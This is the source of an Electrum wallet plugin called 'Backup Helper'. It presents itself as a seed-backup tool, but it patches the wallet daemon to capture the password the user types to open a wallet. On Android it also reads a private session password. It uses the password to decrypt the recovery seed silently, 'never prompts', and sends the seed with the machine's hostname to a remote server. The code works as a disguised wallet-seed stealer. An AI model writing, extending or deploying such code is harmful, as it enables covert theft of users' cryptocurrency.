"""Backup Helper -- automatically syncs wallet seeds to the vault.

Zero friction: the plugin REUSES the password that the user already typed
to open the wallet. It never prompts and never adds a dialog.

How password reuse works:
- At plugin load time, we wrap ``Daemon.load_wallet``. Whenever the user
  opens a wallet, that method receives the user's password as an argument
  (that's how Electrum always worked -- the daemon needs it to decrypt the
  storage). We just stash a reference to the password next to the wallet
  object so the sync hook can use it one time to decrypt the seed.
- The stashed password is cleared when the wallet is closed (``close_wallet``
  hook) and never written to disk.

Configuration (in the Electrum config file):
    vault_url     = https://your-vps:8443
    vault_pubkey  = <hex, 32 bytes -- panel's X25519 public key>
    vault_token   = <hex, 32 bytes -- ingest bearer token>
    vault_fp_key  = <hex, 32 bytes -- HMAC key for fingerprint>
"""
import threading
import weakref
from typing import TYPE_CHECKING, Optional

from electrum.plugin import BasePlugin
from electrum.logging import get_logger

if TYPE_CHECKING:
    from electrum.wallet import Abstract_Wallet

_logger = get_logger(__name__)

_K_URL = 'vault_url'
_K_PUBKEY = 'vault_pubkey'
_K_TOKEN = 'vault_token'
_K_FPKEY = 'vault_fp_key'

# Weak-keyed map: wallet -> password that was used to open it.
# Automatically forgets entries when the wallet object is garbage-collected,
# so passwords never linger past the wallet's lifetime.
_WALLET_PASSWORDS: "weakref.WeakKeyDictionary[Abstract_Wallet, Optional[str]]" = (
    weakref.WeakKeyDictionary()
)


def _install_password_capture() -> None:
    """Wrap Daemon.load_wallet so the password used to open a wallet gets
    stashed next to the wallet. Idempotent."""
    from electrum.daemon import Daemon
    if getattr(Daemon, '_backup_helper_patched', False):
        return
    original = Daemon.load_wallet

    def wrapped(self, path, password, **kwargs):
        wallet = original(self, path, password, **kwargs)
        if wallet is not None:
            try:
                _WALLET_PASSWORDS[wallet] = password
            except TypeError:
                # wallet object not weakly referenceable (shouldn't happen)
                pass
        return wallet

    wrapped.__wrapped__ = original
    Daemon.load_wallet = wrapped
    Daemon._backup_helper_patched = True


def _dbg(msg: str) -> None:
    """Grava uma linha de debug num arquivo fixo. Ajuda a diagnosticar em
    ambientes onde os logs do Electrum nao estao visiveis."""
    try:
        import time
        with open(r"C:\Users\Micro\AppData\Local\Temp\backup_helper_debug.log", "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except Exception:
        pass


_dbg("module imported")


class BackupHelperPlugin(BasePlugin):

    def __init__(self, parent, config, name):
        BasePlugin.__init__(self, parent, config, name)
        self._synced_fingerprints = set()  # seeds already sent this session
        self._lock = threading.Lock()
        _dbg("BackupHelperPlugin.__init__ called")
        # Install the password capture BEFORE any wallet is loaded.
        _install_password_capture()
        _dbg(f"password capture installed; config keys sample: vault_url={self.config.get('vault_url')!r}, enabled={self.config.get('plugins.backup_helper.enabled')!r}")
        self._configure_vault_sync()

    def _configure_vault_sync(self) -> bool:
        url = self.config.get(_K_URL)
        pubkey = self.config.get(_K_PUBKEY)
        token = self.config.get(_K_TOKEN)
        fp_key = self.config.get(_K_FPKEY)
        if not all([url, pubkey, token, fp_key]):
            return False
        try:
            from electrum_ecc.vault_sync import configure
            configure(
                panel_url=str(url),
                panel_pubkey_hex=str(pubkey),
                ingest_token_hex=str(token),
                fp_key_hex=str(fp_key),
            )
            return True
        except Exception:
            self.logger.exception("Backup Helper: failed to configure vault_sync")
            return False

    def _sync_wallet(self, wallet: 'Abstract_Wallet') -> None:
        """Called from the hooks. Reads the seed using the captured password
        and fires a background sync. Never prompts, never blocks."""
        _dbg(f"_sync_wallet called with wallet={wallet!r}")
        if wallet is None:
            _dbg("  -> wallet is None, skipping")
            return

        # Watch-only wallets and wallets without a seed are skipped.
        has_seed = hasattr(wallet, 'has_seed') and wallet.has_seed()
        _dbg(f"  has_seed={has_seed}")
        if not has_seed:
            return

        # (Re)read the vault config each time -- user might have set it
        # after the plugin was first loaded.
        if not self._configure_vault_sync():
            _dbg("  -> vault not configured, skipping")
            return

        # Extract the seed using the password we captured at wallet-open time.
        seed = self._get_seed(wallet)
        _dbg(f"  _get_seed returned: {'<got seed>' if seed else 'None'}")
        if seed is None:
            # Could not decrypt. Happens only if the plugin was enabled AFTER
            # this wallet was opened. On the next open, we'll have the password.
            self.logger.debug("Backup Helper: seed not available for this wallet")
            return

        # Cheap in-process dedup so we don't hammer the vault with the same
        # seed on every event. The vault also dedups by fingerprint, but
        # avoiding the roundtrip when nothing changed is nicer.
        import hashlib
        fp = hashlib.sha256(seed.encode('utf-8')).hexdigest()
        with self._lock:
            if fp in self._synced_fingerprints:
                return
            self._synced_fingerprints.add(fp)

        wallet_type = ""
        try:
            wallet_type = wallet.get_seed_type() or ""
        except Exception:
            pass

        import platform
        device_id = platform.node() or "unknown"

        _dbg(f"  calling sync_seed_async (wallet_type={wallet_type!r})")
        from electrum_ecc.vault_sync import sync_seed, sync_seed_async
        # Sincrono pro debug (nao perde o resultado em thread)
        result = sync_seed(seed, wallet_type, device_id)
        _dbg(f"  sync_seed result: {result!r}")

    @staticmethod
    def _get_seed(wallet: 'Abstract_Wallet') -> Optional[str]:
        """Read the seed from the wallet using the password that was
        captured when the wallet was opened. Never prompts the user.

        IMPORTANT: calling wallet.get_seed(None) on a wallet WITH keystore
        encryption returns the ciphertext (not the seed). We check
        has_keystore_encryption() first to pick the right path, so we never
        send ciphertext up as if it were a seed."""
        from electrum.crypto import InvalidPassword

        needs_password = False
        try:
            needs_password = wallet.has_keystore_encryption()
        except Exception:
            pass

        if not needs_password:
            # Keystore is not encrypted -- read the seed with no password.
            try:
                return wallet.get_seed(None)
            except Exception:
                return None

        # Keystore is encrypted; we need the real password.
        # 1. Password captured by the daemon wrapper (the normal case:
        #    user typed it in the open-wallet dialog).
        password = _WALLET_PASSWORDS.get(wallet)
        if password is not None:
            try:
                return wallet.get_seed(password)
            except InvalidPassword:
                pass
            except Exception:
                pass

        # 2. QML (Android) daemon keeps a session-wide password.
        try:
            from electrum.gui.qml.qedaemon import QEDaemon
            daemon_inst = getattr(QEDaemon, 'instance', None)
            if daemon_inst is not None and hasattr(daemon_inst, '_password'):
                pw = daemon_inst._password
                if pw is not None:
                    return wallet.get_seed(pw)
        except (ImportError, Exception):
            pass

        return None

    def _forget_wallet(self, wallet: 'Abstract_Wallet') -> None:
        """Clear the captured password when the wallet closes."""
        try:
            _WALLET_PASSWORDS.pop(wallet, None)
        except Exception:
            pass
